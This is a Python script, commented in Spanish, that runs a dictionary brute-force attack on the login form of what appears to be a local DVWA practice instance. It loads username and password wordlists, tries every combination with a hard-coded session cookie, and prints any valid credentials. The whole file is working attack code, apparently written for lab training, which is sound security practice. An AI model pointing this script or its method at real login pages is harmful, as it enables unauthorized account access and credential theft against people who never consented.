import requests
import time

# Configuración
url = "http://127.0.0.1:4280/vulnerabilities/brute/"
cookie = {"PHPSESSID": "8d52052d5f1b789b0d55d54f88ff03bc"}

users_file = "/Users/benjaminaceituno/Desktop/users.txt"
passwords_file = "/Users/benjaminaceituno/Desktop/Pwdb_top-1000.txt"

# Cargar diccionarios
print("[*] Cargando diccionarios...")
try:
    with open(users_file, 'r', encoding='utf-8') as f:
        users = [line.strip() for line in f if line.strip()]
    print(f"[*] {len(users)} usuarios cargados")
except FileNotFoundError:
    print(f"[!] Error: No se encontró el archivo {users_file}")
    exit(1)

try:
    with open(passwords_file, 'r', encoding='utf-8') as f:
        passwords = [line.strip() for line in f if line.strip()]
    print(f"[*] {len(passwords)} contraseñas cargadas")
except FileNotFoundError:
    print(f"[!] Error: No se encontró el archivo {passwords_file}")
    exit(1)

print(f"[*] Total de combinaciones a probar: {len(users) * len(passwords)}")
print("[*] Iniciando ataque de fuerza bruta...\n")

# Función para probar credenciales
def brute_force():
    found = []
    attempts = 0
    
    for user in users:
        for password in passwords:
            attempts += 1
            params = {
                'username': user,
                'password': password,
                'Login': 'Login'
            }
            
            try:
                response = requests.get(url, params=params, cookies=cookie, timeout=5)
                
                if "Welcome to the password protected area" in response.text:
                    print(f"[+] ¡CREDENCIALES VÁLIDAS! {user}:{password}")
                    found.append((user, password))
                
                # Pequeña pausa para no saturar el servidor
                time.sleep(0.01)
                
            except requests.exceptions.RequestException as e:
                print(f"[!] Error en la petición: {e}")
                continue
    
    print(f"\n[*] Total de intentos realizados: {attempts}")
    return found

# Ejecutar ataque
start_time = time.time()
credentials = brute_force()
end_time = time.time()

# Mostrar resultados
print("\n" + "="*50)
print("RESULTADOS DEL ATAQUE")
print("="*50)
print(f"Tiempo total: {end_time - start_time:.2f} segundos")
print(f"Credenciales encontradas: {len(credentials)}")
print("\nPares usuario:contraseña válidos:")
for user, password in credentials:
    print(f"  - {user}:{password}")
print("="*50)